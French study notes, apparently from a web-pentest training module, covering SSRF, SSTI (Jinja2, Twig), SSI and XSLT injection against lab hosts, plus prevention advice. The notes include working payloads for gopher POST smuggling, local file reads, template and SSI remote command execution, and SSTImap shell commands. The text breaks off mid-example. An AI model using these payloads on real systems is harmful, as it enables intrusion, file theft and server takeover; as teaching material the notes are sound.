🧪 Web Fuzzing

🎯 Définition

Les server-side attacks ciblent l'application ou le service fourni par un serveur, tandis que les attaques côté client se produisent sur la machine du client et non sur le serveur lui-même. Comprendre et identifier ces différences sera essentiel en pentest et bug bounty. Par exemple, les vulnérabilités comme le Cross-Site Scripting (XSS) ciblent le navigateur web, c'est-à-dire le client, à l'inverse des attaques côté serveur qui ciblent le serveur web.

🎯 Les différents types de failles côté serveur

  • Server-Side Request Forgery (SSRF)
  • Server-Side Template Injection (SSTI)
  • Server-Side Includes (SSI) Injection
  • eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection

Server-Side Request Forgery (SSRF)

La Server-Side Request Forgery (SSRF) est une vulnérabilité qui permet à un attaquant de manipuler une application web afin de lui faire envoyer des requêtes non autorisées depuis le serveur lui‑même. Cette faille apparaît généralement lorsqu'une application effectue des requêtes HTTP vers d'autres serveurs en utilisant des données fournies par l'utilisateur.

Lorsqu'elle est exploitée avec succès, une SSRF peut permettre à un attaquant d'accéder à des systèmes internes, de contourner des pare-feux ou encore de récupérer des informations sensibles.

Server-Side Template Injection (SSTI)

Les applications web utilisent souvent des moteurs de templates et des modèles côté serveur pour générer dynamiquement des réponses, comme du contenu HTML. Cette génération repose fréquemment sur des données fournies par l'utilisateur, permettant à l'application de s'adapter dynamiquement à ses actions.

Lorsqu'un attaquant parvient à injecter du code dans un template, une vulnérabilité de type Server-Side Template Injection (SSTI) peut se produire. Une SSTI peut entraîner divers risques de sécurité, notamment la fuite de données et, dans les cas les plus graves, la compromission complète du serveur via l'exécution de code à distance.

XSLT Server-Side Injection

La XSLT Server-Side Injection est une vulnérabilité qui apparaît lorsqu'un attaquant parvient à manipuler les transformations XSLT exécutées sur le serveur. Le langage XSLT (Extensible Stylesheet Language Transformations) est utilisé pour transformer des documents XML en d'autres formats, comme du HTML, et il est fréquemment employé dans les applications web pour générer du contenu dynamiquement.

Dans le cadre d'une injection XSLT côté serveur, l'attaquant exploite des faiblesses dans la manière dont les transformations XSLT sont traitées. Cela peut lui permettre d'injecter et d'exécuter du code arbitraire sur le serveur, entraînant des risques majeurs tels que la fuite de données ou la compromission complète du système.

Introduction à la SSRF

Les vulnérabilités de type Server-Side Request Forgery (SSRF) font partie du Top 10 de l'OWASP. Ce type de vulnérabilité apparaît lorsqu'une application web récupère des ressources distantes en se basant sur des données fournies par l'utilisateur, comme une URL.

Server-Side Request Forgery

Lorsqu'un serveur web récupère des ressources distantes en fonction d'une entrée utilisateur, un attaquant peut potentiellement forcer le serveur à effectuer des requêtes vers des URL arbitraires qu'il contrôle. Dans ce cas, le serveur est vulnérable à une SSRF.

Même si cela peut sembler anodin au premier abord, selon la configuration de l'application web, une SSRF peut avoir des conséquences dévastatrices, comme nous le verrons dans les sections suivantes.

De plus, si l'application web repose sur un schéma ou un protocole d'URL fourni par l'utilisateur, un attaquant peut provoquer des comportements encore plus dangereux en manipulant ce schéma. Voici quelques exemples de schémas d'URL couramment utilisés dans l'exploitation des vulnérabilités SSRF :

  • http:// et https:// : Ces schémas permettent de récupérer du contenu via des requêtes HTTP/S. Un attaquant peut les utiliser pour contourner des WAF, accéder à des endpoints restreints ou atteindre des services internes.
  • file:// : Ce schéma permet de lire un fichier présent sur le système local. Un attaquant peut l'exploiter pour lire des fichiers locaux sur le serveur (LFI).
  • gopher:// : Ce protocole permet d'envoyer des octets arbitraires à une adresse donnée. Un attaquant peut l'utiliser pour envoyer des requêtes HTTP POST avec un payload personnalisé ou communiquer avec d'autres services, comme des serveurs SMTP ou des bases de données.

Pour plus de détails sur les techniques avancées d'exploitation SSRF, comme les contournements de filtres ou le DNS rebinding, consultez le module Modern Web Exploitation Techniques.

Exploitation des Vulnérabilités SSRF

L'exploitation des vulnérabilités SSRF permet d'aller au‑delà de la simple énumération du serveur web et d'augmenter considérablement l'impact de ces failles.

1. Accéder aux Endpoints Restreints

Problème : L'application web récupère des informations de disponibilité depuis dateserver.htb, mais l'accès direct est interdit.

Solution : Utiliser la vulnérabilité SSRF pour énumérer des endpoints supplémentaires.

Outil utilisé : ffuf pour un brute‑force de répertoires. 

ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
-u http://172.17.0.2/index.php -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
-fr "Server at dateserver.htb Port 80"

Accès à l'endpoint

L'URL http://dateserver.htb/admin.php peut être envoyée via le paramètre dateserver pour tenter d'accéder à des informations sensibles.

2. Inclusion Locale de Fichiers (LFI)

Technique : Manipuler le schéma d'URL pour lire des fichiers locaux.
Exemple : Utiliser le schéma file:// pour lire /etc/passwd. 

file:///etc/passwd

Impact : Permet de lire des fichiers arbitraires, y compris le code source de l'application web.

3. Le Protocole Gopher

Problème : Le schéma http:// est limité aux requêtes GET et ne permet pas d'envoyer des requêtes POST nécessaires pour certains endpoints.

Solution : Utiliser le schéma gopher:// pour envoyer des octets arbitraires à un socket TCP, permettant de construire manuellement des requêtes POST.

Construction d'une requête POST :

gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

Envoi via SSRF (double encodage) :

POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01

4. Utilisation de Gopherus pour Générer des URLs Gopher

Problème : Construire manuellement des URLs Gopher est complexe.

Solution : Utiliser Gopherus pour générer automatiquement des URLs Gopher pour divers services (MySQL, PostgreSQL, Redis, SMTP, etc.).

Prérequis : Python 2. 

python2.7 gopherus.py --exploit smtp

Exemple d'URL Gopher générée :

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF!%0A.

Exploiting SSRF

Après avoir vu comment identifier une vulnérabilité SSRF et l'utiliser pour énumérer un serveur web, explorons maintenant des techniques d'exploitation avancées permettant d'augmenter l'impact de ces failles.

1. Accéder aux Endpoints Restreints

L'application web récupère des informations de disponibilité depuis dateserver.htb. Cependant, même en ajoutant ce domaine dans le fichier hosts, l'accès direct est refusé : 

http://dateserver.htb:<PORT>/
Forbidden: You don't have permission to access this resource.
Apache server at dateserver.htb.

Grâce à la SSRF, nous pouvons tout de même accéder et énumérer le domaine. Par exemple, nous pouvons effectuer un brute‑force de répertoires avec ffuf.

Commande utilisée :

ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
-u http://172.17.0.2/index.php -X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
-fr "Server at dateserver.htb Port 80"

Résultats :

[Status: 200] FUZZ: admin
[Status: 200] FUZZ: availability

Nous avons identifié un endpoint interne supplémentaire : http://dateserver.htb/admin.php, accessible via la SSRF.

2. Local File Inclusion (LFI)

En manipulant le schéma d'URL, nous pouvons provoquer des comportements inattendus. Par exemple, en utilisant le schéma file://, nous pouvons lire des fichiers locaux. 

file:///etc/passwd

Cela permet de lire des fichiers arbitraires, y compris le code source de l'application web.

3. Le Protocole Gopher

La SSRF via http:// est limitée aux requêtes GET. Impossible donc d'envoyer une requête POST pour un formulaire de connexion interne.

Le schéma gopher:// permet d'envoyer des octets arbitraires à un socket TCP, ce qui nous permet de construire manuellement une requête POST.

Requête POST à envoyer :

POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin

Encodage en URL Gopher :

gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

Comme l'URL est envoyée dans un paramètre POST, elle doit être encodée une seconde fois : 

POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01

Le serveur interne accepte alors notre requête POST et nous donne accès au tableau de bord admin.

4. Utilisation de Gopherus pour Générer des URLs Gopher

Construire manuellement des URLs Gopher est complexe. L'outil Gopherus permet de générer automatiquement des URLs valides pour :

  • MySQL
  • PostgreSQL
  • FastCGI
  • Redis
  • SMTP
  • Zabbix
  • pymemcache / rbmemcache / phpmemcache / dmpmemcache

Exécution :

python2.7 gopherus.py --exploit smtp

Exemple d'URL Gopher SMTP générée :

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

Blind SSRF

Dans de nombreux cas réels, les vulnérabilités SSRF sont blind : la réponse de la requête effectuée par le serveur n'est pas directement affichée à l'attaquant. On parle alors de Blind SSRF, car il est impossible de voir la réponse. Les vecteurs d'exploitation sont donc beaucoup plus limités, et l'impact est généralement plus faible que pour une SSRF classique.

Identifier une Blind SSRF

L'application se comporte comme précédemment : elle récupère une URL fournie par l'utilisateur. On peut confirmer la SSRF en pointant vers un système que l'on contrôle et en écoutant avec nc : 

nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*

En revanche, lorsqu'on pointe l'application vers elle‑même, la réponse ne contient pas le HTML de la requête forcée, mais un simple message indiquant que la date est indisponible. Cela indique une Blind SSRF.

Exploiter une Blind SSRF

L'exploitation est beaucoup plus limitée que pour une SSRF classique, mais il est parfois possible de :

  • réaliser un scan de ports local (si le message d'erreur diffère entre port ouvert/fermé),
  • énumérer des fichiers existants sur le système (si le message diffère entre fichier présent/absent).

Par exemple, si l'application renvoie Something went wrong! pour un port fermé, mais un autre message (par ex. Date is unavailable) pour un port ouvert répondant en HTTP, on peut en déduire quels ports sont ouverts.

De même, même si l'on ne peut pas lire le contenu d'un fichier local, on peut parfois distinguer un fichier existant d'un fichier inexistant en observant la différence de message d'erreur.

Ainsi, même sans exfiltrer directement des données, une Blind SSRF permet encore :

  • d'énumérer des ports ouverts sur le réseau interne,
  • d'identifier des fichiers présents sur le système,
  • de mieux comprendre l'architecture interne pour préparer d'autres attaques.

Enfin, même si l'application renvoie le même message pour ports ouverts et fermés, il reste parfois possible d'interagir à l'aveugle avec des services internes en testant des payloads courants sur des applications web internes.

Preventing SSRF

Après avoir étudié l'identification et l'exploitation des vulnérabilités SSRF, il est essentiel de comprendre comment les prévenir. Les mesures de mitigation peuvent être appliquées à la fois au niveau de l'application web et au niveau du réseau.

1. Prévention au Niveau Applicatif

Lorsqu'une application récupère des données depuis un hôte distant en fonction d'une entrée utilisateur, des mesures de sécurité strictes doivent être mises en place pour éviter les scénarios SSRF.

  • Utilisation d'une whitelist d'origines autorisées :
    L'application doit vérifier que l'URL fournie appartient à une liste d'hôtes approuvés. Cela empêche un attaquant de forcer le serveur à contacter des systèmes internes ou arbitraires.
  • Restriction du schéma/protocole :
    Le schéma d'URL (ex. http://, https://) doit être strictement contrôlé. Les protocoles dangereux comme file:// ou gopher:// doivent être interdits. Idéalement, le protocole doit être hardcodé ou validé via une whitelist.
  • Sanitisation des entrées :
    Comme pour toute donnée utilisateur, une validation stricte permet d'éviter des comportements inattendus pouvant mener à une SSRF.

2. Prévention au Niveau Réseau

Même si l'application présente une vulnérabilité SSRF, une configuration réseau restrictive peut empêcher son exploitation.

  • Règles de pare-feu restrictives :
    Le serveur ne doit pouvoir effectuer des requêtes sortantes qu'envers des hôtes explicitement autorisés. Toute requête vers des systèmes internes sensibles doit être bloquée.
  • Ségrégation réseau :
    Une segmentation appropriée empêche un attaquant d'utiliser une SSRF pour atteindre des systèmes internes critiques ou non exposés.

Pour plus de détails sur les mesures de mitigation SSRF, consultez le OWASP SSRF Prevention Cheat Sheet.

Template Engines

Un moteur de template (template engine) est un logiciel qui combine des modèles prédéfinis avec des données dynamiques afin de générer des réponses dynamiques. Les applications web les utilisent fréquemment pour afficher des pages partageant des éléments communs (comme un header ou un footer) tout en insérant du contenu variable. Cela évite la duplication de code et améliore la maintenabilité. Parmi les moteurs de template populaires, on retrouve Jinja et Twig.

Templating

Les moteurs de template nécessitent généralement deux éléments :

  • Un template — une chaîne ou un fichier contenant des emplacements réservés.
  • Des valeurs dynamiques — fournies sous forme de paires clé‑valeur.

Le moteur remplace ensuite les variables du template par les valeurs fournies. Ce processus est appelé rendering.

La syntaxe dépend du moteur utilisé. Pour les exemples suivants, nous utiliserons la syntaxe du moteur Jinja.

Exemple simple

{% verbatim %} 
Hello {{ name }}!
{% endverbatim %}

Si nous rendons ce template avec name="vautia", le résultat sera : 

Hello vautia!

Exemple avec boucle

{% verbatim %} 
{% for name in names %}
Hello {{ name }}!
{% endfor %}
{% endverbatim %}

Si nous fournissons la liste names=["vautia", "21y4d", "Pedant"], le moteur génère : 

Hello vautia!
Hello 21y4d!
Hello Pedant!

Les moteurs de template modernes supportent également des fonctionnalités avancées comme les conditions, les boucles, les filtres, et parfois même des opérations proches de celles d'un langage de programmation.

Introduction to SSTI

Comme son nom l'indique, une Server‑Side Template Injection (SSTI) survient lorsqu'un attaquant parvient à injecter du code de template dans un modèle qui sera ensuite rendu par le serveur. Si du code malveillant est injecté, le serveur peut l'exécuter lors du rendu, permettant à l'attaquant de prendre un contrôle total du serveur.

Server‑Side Template Injection

Comme nous l'avons vu dans la section précédente, le rendu d'un template implique l'insertion de valeurs dynamiques dans un modèle. Souvent, ces valeurs proviennent de l'utilisateur. Cependant, tant que ces valeurs sont fournies comme données au moteur de template, elles ne sont jamais exécutées : elles sont simplement insérées dans le modèle.

En revanche, une SSTI apparaît lorsqu'un attaquant peut contrôler le template lui‑même. Les moteurs de template exécutent le code présent dans le modèle, ce qui signifie que toute injection dans le template peut conduire à l'exécution de code arbitraire.

Si le templating est correctement implémenté, l'entrée utilisateur est toujours fournie comme valeur au moteur de rendu, et jamais insérée dans la chaîne du template. Cependant, plusieurs scénarios peuvent introduire une SSTI :

  • Insertion de données utilisateur dans le template avant le rendu :
    Si l'application concatène des données utilisateur dans le modèle avant de l'envoyer au moteur de rendu, l'utilisateur contrôle alors une partie du template.
  • Double rendu d'un même template :
    Si une application rend un template une première fois, puis insère l'output dans un second rendu, toute donnée utilisateur présente dans le premier rendu devient du code de template dans le second.
  • Modification directe de templates par l'utilisateur :
    Si l'application permet d'éditer ou de soumettre des templates, l'attaquant peut injecter du code directement dans le modèle.

Dans tous ces cas, l'attaquant peut exploiter la logique interne du moteur de template pour exécuter du code arbitraire, accéder à des variables internes, lire des fichiers, ou même exécuter des commandes système selon les capacités du moteur.

Identifying SSTI

Avant d'exploiter une vulnérabilité de Server‑Side Template Injection (SSTI), il est essentiel de confirmer qu'elle existe réellement et d'identifier le moteur de template utilisé. L'exploitation dépend fortement du moteur (Jinja, Twig, etc.), car chacun possède sa propre syntaxe et ses propres fonctions.

Confirming SSTI

L'identification d'une SSTI est similaire à celle d'autres injections (comme SQLi) : on injecte des caractères spéciaux ayant une signification particulière pour les moteurs de template et on observe le comportement de l'application.

Un test classique consiste à injecter la chaîne suivante, qui contient de nombreux caractères spéciaux utilisés par les moteurs de template :

{% verbatim %} 
${{<%[%'"}}%\.
{% endverbatim %}

Cette chaîne devrait presque toujours violer la syntaxe du template et provoquer une erreur si l'application est vulnérable à la SSTI, de la même manière qu'un simple ' peut casser une requête SQL vulnérable.

Exemple : sur une application avec un champ name reflété dans la page suivante, l'injection de cette chaîne peut produire une erreur Internal Server Error, ce qui augmente fortement la suspicion d'une SSTI sur ce paramètre.

Identifying the Template Engine

Pour exploiter correctement une SSTI, il faut ensuite déterminer le moteur de template utilisé. On peut s'appuyer sur de légères différences de comportement entre les moteurs.

Une approche courante consiste à injecter successivement plusieurs payloads simples et à observer le résultat. Par exemple, on commence par :

{% verbatim %} 
${7*7}
{% endverbatim %}

Si ce payload est exécuté, on suit une branche (par exemple, résultat 49), sinon on teste un autre payload :

{% verbatim %} 
{{7*7}}
{% endverbatim %}

Si cette fois le résultat affiché est 49, on sait que le moteur exécute cette syntaxe. On peut alors raffiner avec un payload comme :

{% verbatim %} 
{{7*'7'}}
{% endverbatim %}

Selon le moteur, le résultat diffère : Jinja renverra 7777777, tandis que Twig renverra 49. Ces différences permettent de déduire précisément le moteur de template en place.

Exploiting SSTI – Jinja2

Maintenant que nous avons identifié le moteur de template utilisé par l'application web vulnérable à la SSTI, nous pouvons passer à son exploitation. Dans cette section, nous supposons que le moteur utilisé est Jinja2, couramment employé dans des frameworks Python tels que Flask ou Django.

Les payloads présentés ici se basent sur un environnement Flask. Selon le framework Python utilisé, certains détails peuvent varier.

Dans nos payloads, nous pouvons utiliser n'importe quelle bibliothèque déjà importée par l'application Python, directement ou indirectement. Il est également possible d'importer des bibliothèques supplémentaires via l'instruction import.

Information Disclosure

Une SSTI permet d'obtenir des informations internes sur l'application, comme sa configuration ou son code source. Par exemple, pour afficher la configuration Flask, on peut utiliser :

{% verbatim %} 
{{ config.items() }}
{% endverbatim %}

Ce payload divulgue l'intégralité de la configuration, y compris d'éventuelles clés secrètes, ce qui peut faciliter des attaques ultérieures.

On peut également accéder aux fonctions Python internes via l'objet __builtins__ : 

{% verbatim %}{{ self.__init__.__globals__.__builtins__ }}{% endverbatim %}

Cela permet d'explorer les fonctions disponibles et de préparer des attaques plus avancées.

Local File Inclusion (LFI)

Grâce à la fonction Python open(), il est possible de lire des fichiers locaux. Comme elle n'est pas directement accessible, il faut la récupérer depuis __builtins__.

Exemple : lecture de /etc/passwd

{% verbatim %}{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}{% endverbatim %}

Ce payload lit et affiche le contenu du fichier, permettant d'obtenir des informations sensibles sur le système.

Remote Code Execution (RCE)

Pour exécuter des commandes système, on peut utiliser la bibliothèque Python os (fonctions system, popen, etc.). Si elle n'est pas importée, il est possible de l'importer via la fonction __import__.

Le payload général pour importer une bibliothèque et exécuter une commande suit ce schéma : 

{% verbatim %}{{ self.__init__.__globals__.__builtins__.__import__("os").popen("COMMAND").read() }}{% endverbatim %}

En remplaçant COMMAND par une commande système, l'application exécutera cette commande lors du rendu du template.

Exploiting SSTI – Twig

Dans cette section, nous explorons un second exemple d'exploitation SSTI. Après avoir étudié l'exploitation SSTI dans le moteur Jinja2, nous allons maintenant analyser l'exploitation dans Twig, un moteur de template utilisé dans les applications PHP. Comme précédemment, nous supposons que la confirmation SSTI et l'identification du moteur ont déjà été réalisées.

Information Disclosure

Twig permet d'obtenir quelques informations internes via le mot‑clé _self : 

{% verbatim %}{{ _self }}{% endverbatim %}

Cependant, contrairement à Jinja2, les informations divulguées sont limitées.

Local File Inclusion (LFI)

Twig, en lui‑même, ne permet pas de lire des fichiers locaux via ses fonctions internes. Toutefois, certains frameworks PHP — comme Symfony — ajoutent des filtres supplémentaires. L'un d'eux, file_excerpt, permet de lire des fichiers locaux : 

{% verbatim %}{{ "/etc/passwd"|file_excerpt(1, -1) }}{% endverbatim %}

Ce payload lit le fichier /etc/passwd et en affiche le contenu.

Remote Code Execution (RCE)

Pour obtenir une exécution de code à distance, on peut utiliser des fonctions internes de PHP, comme system. Twig permet d'appeler des fonctions PHP via son filtre filter.

Exemple de payload RCE :

{% verbatim %} 
{{ ['id'] | filter('system') }}
{% endverbatim %}

Ce payload exécute la commande id et affiche les informations de l'utilisateur sous lequel tourne le serveur (souvent www-data).

Further Remarks

Dans ce module, nous avons exploré l'exploitation SSTI dans les moteurs Jinja2 et Twig. Comme nous l'avons vu, la syntaxe et les capacités diffèrent selon le moteur, mais le principe général reste le même : si l'attaquant contrôle le template, il contrôle le code exécuté par le moteur.

Pour exploiter un moteur inconnu, il suffit souvent de consulter sa documentation ou d'utiliser des ressources comme le PayloadsAllTheThings – SSTI Cheat Sheet, qui regroupe des payloads pour les moteurs de template les plus courants.

SSTI Tools of the Trade & Preventing SSTI

Cette section présente les outils permettant d'identifier et d'exploiter des vulnérabilités SSTI. Nous verrons également les principales mesures de prévention.

Tools of the Trade

L'outil historique pour l'identification et l'exploitation des SSTI était tplmap. Cependant, il n'est plus maintenu et repose sur Python 2. Nous utiliserons donc SSTImap, une version moderne et maintenue.

Installation :

git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py

Une fois lancé, SSTImap charge ses plugins et attend une URL cible. Pour identifier automatiquement une SSTI et déterminer le moteur de template utilisé : 

python3 sstimap.py -u http://172.17.0.2/index.php?name=test

Exemple de résultat :

Engine: Twig
Injection: *
Capabilities:
  Shell command execution: ok
  File write: ok
  File read: ok
  Code evaluation: ok

SSTImap confirme la SSTI, identifie Twig et liste les capacités exploitables.

Lire un fichier distant

python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

Exécuter une commande système :

python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

Obtenir un shell interactif :

python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

Preventing SSTI

Pour prévenir les vulnérabilités SSTI, il faut garantir que l'entrée utilisateur n'est jamais injectée dans le template avant le rendu. L'utilisateur doit uniquement fournir des valeurs au moteur de template, jamais du code.

  • Ne jamais insérer directement des données utilisateur dans un template.
    Vérifier tous les chemins d'exécution pour s'assurer qu'aucune concaténation dangereuse n'a lieu.
  • Si l'application permet de modifier des templates :
    appliquer un durcissement strict du moteur (suppression des fonctions dangereuses).
  • Isoler l'environnement d'exécution du moteur de template :
    par exemple en utilisant un conteneur Docker dédié, séparé du serveur web.
  • Limiter les fonctions disponibles dans le moteur de template.
    Même si cette technique peut être contournée, elle réduit la surface d'attaque.

La meilleure approche reste une séparation stricte entre le moteur de template et le serveur web, empêchant toute compromission du système principal en cas d'exploitation SSTI.

Introduction to SSI Injection

Les Server-Side Includes (SSI) sont une technologie permettant aux applications web d'ajouter du contenu dynamique dans des pages HTML statiques. SSI est supporté par de nombreux serveurs web tels qu'Apache et IIS.

L'utilisation de SSI peut parfois être déduite de l'extension du fichier (.shtml, .shtm, .stm). Cependant, un serveur peut être configuré pour interpréter des directives SSI dans n'importe quelle extension. Ainsi, l'extension seule ne permet pas de conclure à l'utilisation de SSI.

SSI Directives

Les directives SSI permettent d'ajouter du contenu dynamique dans une page HTML statique. Elles sont composées de :

  • name — le nom de la directive
  • parameter name — un ou plusieurs paramètres
  • value — une ou plusieurs valeurs

Syntaxe générale :

<!--#name param1="value1" param2="value2" -->

Directives courantes

printenv — affiche les variables d'environnement :

<!--#printenv -->

config — modifie la configuration SSI :

<!--#config errmsg="Error!" -->

echo — affiche la valeur d'une variable :

<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->

exec — exécute une commande système :

<!--#exec cmd="whoami" -->

include — inclut un fichier du répertoire web root :

<!--#include virtual="index.html" -->

SSI Injection

Une SSI Injection se produit lorsqu'un attaquant parvient à injecter des directives SSI dans un fichier qui sera ensuite interprété par le serveur web. Lorsque ce fichier est servi, les directives malveillantes sont exécutées.

Ce type de vulnérabilité peut apparaître dans plusieurs scénarios :

  • Upload de fichier vulnérable : si l'application permet d'envoyer un fichier dans le web root, un attaquant peut y inclure des directives SSI.
  • Écriture de données utilisateur dans un fichier servi par le serveur : si l'application écrit du contenu contrôlé par l'utilisateur dans un fichier accessible publiquement, l'attaquant peut y injecter des directives SSI.

Une fois injectées, ces directives peuvent permettre d'afficher des variables internes, lire des fichiers, ou même exécuter des commandes système selon la configuration du serveur.

Exploiting SSI Injection

Maintenant que nous avons vu le fonctionnement des Server-Side Includes (SSI), examinons comment exploiter une vulnérabilité d'SSI Injection.

Exploitation

Dans notre application web d'exemple, nous sommes accueillis par un simple formulaire demandant un nom : 

http://<SERVER_IP>:<PORT>/

Après avoir soumis un nom, nous sommes redirigés vers /page.shtml, qui affiche un message de bienvenue ainsi que des informations générales.

L'extension .shtml suggère que la page utilise les SSI. Si le nom fourni par l'utilisateur est inséré dans la page sans filtrage, il peut être possible d'injecter des directives SSI.

Test de l'injection SSI

Pour vérifier la vulnérabilité, testons l'injection suivante comme nom : 

<!--#printenv -->

Le résultat affiche les variables d'environnement, confirmant que la directive est exécutée. Nous avons donc une SSI Injection.

Exécution de commandes

Pour vérifier si nous pouvons exécuter des commandes système, testons la directive exec : 

<!--#exec cmd="id" -->

La page affiche alors les informations de l'utilisateur système (souvent www-data), confirmant que le serveur exécute bien la commande injectée.

À ce stade, l'attaquant peut exécuter des commandes arbitraires, ce qui lui donne un contrôle complet sur le serveur web selon les permissions du processus.

Preventing SSI Injection

Comme nous l'avons vu, une mauvaise implémentation des Server-Side Includes (SSI) peut introduire des vulnérabilités graves. Une SSI Injection peut mener à l'exécution de commandes système et potentiellement au contrôle total du serveur web. Il est donc essentiel de mettre en place des mesures de sécurité adaptées.

Prevention

Comme pour toute vulnérabilité d'injection, la première ligne de défense consiste à valider et assainir soigneusement les entrées utilisateur. Cela est particulièrement important lorsque :

  • l'entrée utilisateur est utilisée dans une directive SSI,
  • l'entrée utilisateur est écrite dans un fichier susceptible d'être interprété par le serveur web.

Il est également crucial de configurer correctement le serveur web afin de limiter l'utilisation des SSI :

  • Restreindre les SSI à des extensions spécifiques (par exemple uniquement .shtml), afin d'éviter que des fichiers inattendus ne soient interprétés comme des templates SSI.
  • Limiter les SSI à certains répertoires pour empêcher l'exécution de directives dans des zones sensibles du site.
  • Désactiver les directives dangereuses comme exec si elles ne sont pas strictement nécessaires. Cela réduit considérablement l'impact potentiel d'une injection.

Enfin, une approche plus robuste consiste à isoler l'environnement d'exécution dans lequel les SSI sont interprétés. Par exemple, exécuter les pages SSI dans un conteneur ou un environnement séparé du serveur principal permet de limiter les dégâts en cas d'exploitation.

En combinant une configuration serveur stricte, une validation d'entrée rigoureuse et une isolation de l'environnement, il est possible de réduire drastiquement les risques liés aux SSI injections.

Introduction to XSLT Injection

Le langage eXtensible Stylesheet Language Transformation (XSLT) permet de transformer des documents XML. Il peut, par exemple, sélectionner des nœuds spécifiques dans un document XML ou modifier sa structure.

eXtensible Stylesheet Language Transformation (XSLT)

Pour comprendre le fonctionnement d'XSLT, considérons le document XML suivant : 

<?xml version="1.0" encoding="UTF-8"?>
<fruits>
    <fruit>
        <name>Apple</name>
        <color>Red</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Banana</name>
        <color>Yellow</color>
        <size>Medium</size>
    </fruit>
    <fruit>
        <name>Strawberry</name>
        <color>Red</color>
        <size>Small</size>
    </fruit>
</fruits>

Un document XSLT définit un format de sortie enrichi avec les données du document XML. Il ressemble à du XML, mais utilise des éléments XSL préfixés par xsl:.

Éléments XSL courants :

  • <xsl:template> — définit un template appliqué à un nœud XML.
  • <xsl:value-of> — extrait la valeur d'un nœud XML.
  • <xsl:for-each> — boucle sur une liste de nœuds.

Exemple simple : afficher tous les fruits et leur couleur

<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all the fruits:
        <xsl:for-each select="fruit">
            <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>

Résultat :

Here are all the fruits:
    Apple (Red)
    Banana (Yellow)
    Strawberry (Red)

Éléments XSL supplémentaires

  • <xsl:sort> — trie les éléments dans une boucle.
  • <xsl:if> — applique une condition sur un nœud.

Exemple : fruits de taille Medium triés par couleur (descendant)

<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/fruits">
        Here are all fruits of medium size ordered by their color:
        <xsl:for-each select="fruit">
            <xsl:sort select="color" order="descending" />
            <xsl:if test="size = 'Medium'">
                <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
            </xsl:if>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>

Résultat :

Here are all fruits of medium size ordered by their color:
    Banana (Yellow)
    Apple (Red)

XSLT peut générer n'importe quel type de sortie, y compris du HTML. C'est pourquoi certaines applications web l'utilisent pour intégrer des données XML dans des réponses dynamiques.

XSLT Injection

Une XSLT Injection survient lorsque des données utilisateur sont insérées dans un document XSL avant que le processeur XSLT ne génère la sortie. L'attaquant peut alors injecter des éléments XSL supplémentaires, qui seront exécutés lors du traitement.

Cela peut permettre d'accéder à des données sensibles, de contourner des restrictions, ou même d'exécuter du code selon les capacités du processeur XSLT utilisé.

Exploiting XSLT Injection

Après avoir étudié les bases d'XSLT et son fonctionnement, examinons maintenant comment exploiter une vulnérabilité d'XSLT Injection.

Identifying XSLT Injection

Notre application web d'exemple affiche une liste de modules Academy. En bas de la page, un champ permet de personnaliser le titre en fournissant un nom.

Si l'application utilise un document XML combiné à un traitement XSLT, et que le nom fourni est inséré dans le XSL sans filtrage, une XSLT injection peut être possible.

Pour tester cela, nous injectons un tag XML cassé, par exemple : 

<

